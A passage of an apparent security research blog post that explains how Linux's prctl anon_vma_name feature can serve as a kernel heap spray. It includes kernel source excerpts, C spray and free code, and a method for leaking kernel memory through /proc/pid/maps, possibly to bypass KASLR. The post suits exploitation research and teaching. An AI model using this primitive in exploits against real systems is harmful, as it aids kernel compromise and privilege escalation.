</span></span><span class="line"><span class="cl">			<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">IS_ERR</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">				<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">PTR_ERR</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k"><span class="hljs-keyword">for</span></span> <span class="p">(</span><span class="n">pch</span> <span class="o">=</span> <span class="n">name</span><span class="p">;</span> <span class="o">*</span><span class="n">pch</span> <span class="o">!=</span> <span class="sc"><span class="hljs-string">'\0'</span></span><span class="p">;</span> <span class="n">pch</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="o">!</span><span class="n">is_valid_name_char</span><span class="p">(</span><span class="o">*</span><span class="n">pch</span><span class="p">))</span> <span class="p">{</span> <span class="c1"><span class="hljs-comment">// [1]</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="n">kfree</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">					<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">				<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">			<span class="cm"><span class="hljs-comment">/* anon_vma has its own copy */</span></span>
</span></span><span class="line"><span class="cl">			<span class="n">anon_name</span> <span class="o">=</span> <span class="n">anon_vma_name_alloc</span><span class="p">(</span><span class="n">name</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [2]</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="n">kfree</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="o">!</span><span class="n">anon_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="n">mmap_write_lock</span><span class="p">(</span><span class="n">mm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">error</span> <span class="o">=</span> <span class="n">madvise_set_anon_name</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">anon_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">mmap_write_unlock</span><span class="p">(</span><span class="n">mm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n">anon_vma_name_put</span><span class="p">(</span><span class="n">anon_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">break</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">default</span></span><span class="o">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">error</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">error</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>In the code above, it checks ([1]) whether the inputted name has valid, printable characters. If the check passes ([2]), <code>anon_vma_name_alloc</code> is called:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C hljs" data-lang="C"><span class="line"><span class="cl"><span class="k"><span class="hljs-function">struct</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">anon_vma_name</span></span><span class="hljs-function"> </span><span class="o"><span class="hljs-function">*</span></span><span class="nf"><span class="hljs-function"><span class="hljs-title">anon_vma_name_alloc</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="k"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">const</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">name</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">anon_vma_name</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">*</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">anon_name</span></span></span><span class="p"><span class="hljs-class">;</span></span>
</span></span><span class="line"><span class="cl">	<span class="n"><span class="hljs-keyword">size_t</span></span> <span class="n">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm"><span class="hljs-comment">/* Add 1 for NUL terminator at the end of the anon_name-&gt;name */</span></span>
</span></span><span class="line"><span class="cl">	<span class="n">count</span> <span class="o">=</span> <span class="n"><span class="hljs-built_in">strlen</span></span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="o">+</span> <span class="mi"><span class="hljs-number">1</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">anon_name</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="n">struct_size</span><span class="p">(</span><span class="n">anon_name</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">count</span><span class="p">),</span> <span class="n">GFP_KERNEL</span><span class="p">);</span> <span class="c1"><span class="hljs-comment">// [3]</span>
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">anon_name</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">kref_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">anon_name</span><span class="o">-&gt;</span><span class="n">kref</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="n"><span class="hljs-built_in">memcpy</span></span><span class="p">(</span><span class="n">anon_name</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">anon_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Here ([3]), the struct is allocated by <code>kmalloc</code>, and as <code>GFP_KERNEL</code> is specificed, it will go into a normal kmalloc cache. This is very convenient because we can basically spray this into any cache from <code>kmalloc-8</code> to <code>kmalloc-96</code>, and we can avoid any annoying cross-caching from cg caches!</p>
<p>Let’s see how to read from the spray (thanks to my mentor for this bit!). Looking at the <code>show_map_vma</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C hljs" data-lang="C"><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">seq_pad</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="sc"><span class="hljs-string">' '</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="cm"><span class="hljs-comment">/*
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment">		 * If user named this anon shared memory via
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment">		 * prctl(PR_SET_VMA ..., use the provided name.
</span></span></span></span><span class="line"><span class="cl"><span class="cm"><span class="hljs-comment">		 */</span></span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">anon_name</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="n">seq_printf</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="s"><span class="hljs-string">"[anon_shmem:%s]"</span></span><span class="p">,</span> <span class="n">anon_name</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">else</span></span>
</span></span><span class="line"><span class="cl">			<span class="nf">seq_file_path</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">file</span><span class="p">,</span> <span class="s"><span class="hljs-string">"</span></span><span class="se"><span class="hljs-string">\n</span></span><span class="s"><span class="hljs-string">"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">goto</span></span> <span class="n">done</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span></code></pre></div><p>As the newly set name is used, it appears we can read from it via the <code>/proc/pid/maps</code> file, allowing us to possibly leak stuff from kernel memory from the maps file. However, the limitation of this method is that if the information to be leaked contains null bytes, it will print up to those null bytes, and then stop. If you are lucky and you have a kernel text/heap pointer with no null bytes, this method could potentially be used to bypass KASLR.</p>
<p>Let’s look at how the spray can be freed:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C hljs" data-lang="C"><span class="line"><span class="cl"><span class="kt"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">anon_vma_name_free</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">kref</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">kref</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-class"><span class="hljs-keyword">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">anon_vma_name</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">*</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">anon_name</span></span></span><span class="hljs-class"> </span><span class="o"><span class="hljs-class">=</span></span><span class="hljs-class">
</span></span></span><span class="line"><span class="cl"><span class="hljs-class">			</span><span class="n"><span class="hljs-class"><span class="hljs-title">container_of</span></span></span><span class="p"><span class="hljs-class">(</span></span><span class="n"><span class="hljs-class"><span class="hljs-title">kref</span></span></span><span class="p"><span class="hljs-class">,</span></span><span class="hljs-class"> </span><span class="k"><span class="hljs-class"><span class="hljs-title">struct</span></span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">anon_vma_name</span></span></span><span class="p"><span class="hljs-class">,</span></span><span class="hljs-class"> </span><span class="n"><span class="hljs-class"><span class="hljs-title">kref</span></span></span><span class="p"><span class="hljs-class">);</span></span>
</span></span><span class="line"><span class="cl">	<span class="n">kfree</span><span class="p">(</span><span class="n">anon_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Presumably how this object is freed is similar to how files are freed. When the process dies, or if <code>prctl</code> is called again and the name buffer is set to <code>NULL</code>, the reference count is decremented. If the reference count becomes 0, the <code>anon_vma_name</code> object is freed.</p>
<h2 id="how-to-spray-anon_vma_name">How to spray anon_vma_name<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#how-to-spray-anon_vma_name">#</a></h2>
<p>Spraying <code>anon_vma_name</code> is simple: just use the <code>prctl</code> syscall with <code>PR_SET_VMA</code> and <code>PR_SET_VMA_ANON_NAME</code> arguments. One way of doing this is as shown (sorry for bad code):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C hljs" data-lang="C"><span class="line"><span class="cl"><span class="cp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NUM_PRCTLS 1024</span>
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt"><span class="hljs-keyword">void</span></span> <span class="o">*</span> <span class="n">address</span><span class="p">[</span><span class="n">NUM_PRCTLS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt"><span class="hljs-function"><span class="hljs-keyword">int</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">rename_vma</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">addr</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">unsigned</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">size</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">,</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">char</span></span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">name</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> </span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_VMA</span><span class="p">,</span> <span class="n">PR_SET_VMA_ANON_NAME</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">res</span> <span class="o">&lt;</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">perror</span><span class="p">(</span><span class="s"><span class="hljs-string">"[!] prctl"</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	    <span class="k"><span class="hljs-keyword">return</span></span> <span class="o">-</span><span class="n">errno</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">return</span></span> <span class="n">res</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="kt"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="nf"><span class="hljs-function"><span class="hljs-title">spray_vma_name</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="kt"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">void</span></span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function"> </span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k"><span class="hljs-keyword">for</span></span> <span class="p">(</span><span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">idx</span> <span class="o">=</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="n">NUM_PRCTLS</span><span class="p">;</span> <span class="n">idx</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">address</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb"><span class="hljs-literal">NULL</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">1024</span></span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span> <span class="o">|</span> <span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o"><span class="hljs-number">-</span></span><span class="mi"><span class="hljs-number">1</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="kt"><span class="hljs-keyword">char</span></span> <span class="n">buf</span><span class="p">[</span><span class="mi"><span class="hljs-number">80</span></span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt"><span class="hljs-keyword">char</span></span> <span class="n">test_str</span><span class="p">[]</span> <span class="o">=</span> <span class="s"><span class="hljs-string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n"><span class="hljs-built_in">memcpy</span></span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">test_str</span><span class="p">,</span> <span class="mi"><span class="hljs-number">72</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt"><span class="hljs-keyword">char</span></span> <span class="n">store</span><span class="p">[</span><span class="mi"><span class="hljs-number">8</span></span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="n"><span class="hljs-built_in">memset</span></span><span class="p">(</span><span class="n">store</span><span class="p">,</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">,</span> <span class="mi"><span class="hljs-number">8</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n"><span class="hljs-built_in">sprintf</span></span><span class="p">(</span><span class="n">store</span><span class="p">,</span> <span class="s"><span class="hljs-string">"%d"</span></span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n"><span class="hljs-built_in">memcpy</span></span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi"><span class="hljs-number">72</span></span><span class="p">],</span> <span class="n">store</span><span class="p">,</span> <span class="mi"><span class="hljs-number">8</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">rename_vma</span><span class="p">((</span><span class="kt"><span class="hljs-keyword">unsigned</span></span> <span class="kt"><span class="hljs-keyword">long</span></span><span class="p">)</span> <span class="n">address</span><span class="p">[</span><span class="n">idx</span><span class="p">],</span> <span class="mi"><span class="hljs-number">1024</span></span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The names assigned need to be different, because if the same name is used, the kernel would reuse the same <code>anon_vma_name</code> object, and the spray will fail. This is shown in the kernel code:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C hljs" data-lang="C"><span class="line"><span class="cl"><span class="k"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="kr"><span class="hljs-function"><span class="hljs-keyword">inline</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="k"><span class="hljs-function">struct</span></span><span class="hljs-function"> </span><span class="n"><span class="hljs-function">anon_vma_name</span></span><span class="hljs-function"> </span><span class="o"><span class="hljs-function">*</span></span><span class="nf"><span class="hljs-function"><span class="hljs-title">anon_vma_name_reuse</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">(</span></span></span><span class="k"><span class="hljs-function"><span class="hljs-params">struct</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="n"><span class="hljs-function"><span class="hljs-params">anon_vma_name</span></span></span><span class="hljs-function"><span class="hljs-params"> </span></span><span class="o"><span class="hljs-function"><span class="hljs-params">*</span></span></span><span class="n"><span class="hljs-function"><span class="hljs-params">anon_name</span></span></span><span class="p"><span class="hljs-function"><span class="hljs-params">)</span></span></span><span class="hljs-function">
</span></span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="cm"><span class="hljs-comment">/* Prevent anon_name refcount saturation early on */</span></span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">if</span></span> <span class="p">(</span><span class="n">kref_read</span><span class="p">(</span><span class="o">&amp;</span><span class="n">anon_name</span><span class="o">-&gt;</span><span class="n">kref</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">REFCOUNT_MAX</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="n">anon_vma_name_get</span><span class="p">(</span><span class="n">anon_name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">anon_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="k"><span class="hljs-keyword">return</span></span> <span class="n">anon_vma_name_alloc</span><span class="p">(</span><span class="n">anon_name</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>On gdb, the spray looks as such (the garbage data above the spray is what I wanted to read, it was written to the same address as the sprayed object due to how the challenge works):</p>
<p><img loading="lazy" src="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/07-prctlheapspray1.png" alt="Spray on gdb">
</p>
<p>In order to read from the spray, all you need to do is to cat the <code>/proc/pid/maps</code> file!</p>
<p><img loading="lazy" src="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/07-prctlheapspray3.png" alt="Reading from maps file">
</p>
<p>You can also do it programmatically in your code:</p>
<p><img loading="lazy" src="./prctl anon_vma_name_ An Amusing Linux Kernel Heap Spray _ STAR Labs_files/07-prctlheapspray2.png" alt="Leaked key">
</p>
<p>The last hexadecimal number is the leaked secret key which was written to the <code>anon_vma_name</code> object, and is the same as that in the first image.</p>
<p>As very well put by my fellow intern, this is the equivalent of leaking stuff from kernel memory via the task manager :D</p>
<p>To free the spray, all you need to do is to use the <code>prctl</code> syscall again, but this time setting the name buffer to <code>NULL</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C hljs" data-lang="C"><span class="line"><span class="cl"><span class="k"><span class="hljs-keyword">for</span></span> <span class="p">(</span><span class="kt"><span class="hljs-keyword">int</span></span> <span class="n">i</span> <span class="o">=</span> <span class="mi"><span class="hljs-number">0</span></span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_PRCTLS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">rename_vma</span><span class="p">((</span><span class="kt"><span class="hljs-keyword">unsigned</span></span> <span class="kt"><span class="hljs-keyword">long</span></span><span class="p">)</span> <span class="n">address</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi"><span class="hljs-number">1024</span></span><span class="p">,</span> <span class="nb"><span class="hljs-literal">NULL</span></span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="conclusion">Conclusion<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#conclusion">#</a></h2>
<p>prctl’s <code>PR_SET_VMA</code> can be used as a nice convenient heap spray into <code>kmalloc-8</code> to <code>kmalloc-96</code>. Thanks to <a href="https://twitter.com/st424204">Billy</a> for mentoring me and I hope to learn and find more interesting things in the weeks to come! :D</p>
<h2 id="references">References<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#references">#</a></h2>
<ol>
<li><a href="https://elixir.bootlin.com/linux/v6.1.37/source/include/linux/mm_inline.h">https://elixir.bootlin.com/linux/v6.1.37/source/include/linux/mm_inline.h</a></li>
<li><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">https://man7.org/linux/man-pages/man2/prctl.2.html</a></li>
</ol>
</div>
<footer class="post-footer">
<ul class="post-tags">
</ul>
</footer>
</article>
</main>
<footer class="footer">
<span>© 2023 <a href="https://starlabs.sg/">STAR Labs</a></span>
<span>
Powered by
<a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
<a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
</span>
</footer>
<a href="https://starlabs.sg/blog/2023/07-prctl-anon_vma_name-an-amusing-heap-spray/#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
<path d="M12 6H0l6-6z"></path>
</svg>
</a>
<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>


<div id="rememberry__extension__root" style="all: unset;"><template shadowrootmode="open"><main data-reactroot=""><!-- react-empty: 2 --><!-- react-empty: 3 --></main><style type="text/css">.Translator__wrapper__2qJID {
  position: absolute;
  left: 0;
  z-index: 1010;
  width: 100vw;
  opacity: 1;
  transition: opacity 200ms cubic-bezier(0.18, 0.65, 0.26, 0.98), transform 200ms ease-out; }
  .Translator__wrapper__2qJID[data-popup-direction="downward"] {
    top: 0;
    transform: translateY(9px); }
    .Translator__wrapper__2qJID[data-popup-direction="downward"] > .Translator__translation-popup__2_mD4 > .Translator__arrow__3eIZZ {
      top: -8px;
      transform: translateX(-50%) rotate(45deg);
      background-color: #2EC4B6; }
    .Translator__wrapper__2qJID[data-popup-direction="downward"] > .Translator__translation-popup__2_mD4:after {
      top: 0; }
  .Translator__wrapper__2qJID[data-popup-direction="upward"] {
    bottom: 0;
    transform: translateY(-8px); }
    .Translator__wrapper__2qJID[data-popup-direction="upward"] > .Translator__translation-popup__2_mD4 > .Translator__arrow__3eIZZ {
      bottom: -8px;
      transform: translateX(-50%) rotate(-135deg);
      background-color: #FDFFFC; }
    .Translator__wrapper__2qJID[data-popup-direction="upward"] > .Translator__translation-popup__2_mD4:after {
      bottom: 0; }
  .Translator__wrapper__2qJID:not([data-popup-direction="none"]) > .Translator__translation-popup__2_mD4:after {
    position: absolute;
    transform: translateX(-50%);
    width: 32px;
    height: 16px;
    background-color: #FDFFFC;
    content: ''; }
  .Translator__wrapper__2qJID:not([data-popup-direction="none"]) > .Translator__translation-popup__2_mD4 > .Translator__arrow__3eIZZ {
    position: absolute;
    width: 16px;
    height: 16px;
    border-top: 1px solid #2EC4B6;
    border-left: 1px solid #2EC4B6;
    box-shadow: 0 0 8px rgba(1, 22, 39, 0.3); }
  .Translator__wrapper__2qJID.Translator__in__3rwf1 {
    transform: translateY(0); }
  .Translator__wrapper__2qJID.Translator__in__3rwf1, .Translator__wrapper__2qJID.Translator__out__3AHaS {
    opacity: 0; }
  .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 {
    position: absolute;
    display: flex;
    min-width: 180px;
    max-width: 360px;
    border: 1px solid #2EC4B6;
    border-radius: 4px;
    box-shadow: 0 0 8px rgba(1, 22, 39, 0.3);
    flex-direction: column;
    color: #011627;
    background-color: #FDFFFC; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-10%"] {
      transform: translateX(-10%); }
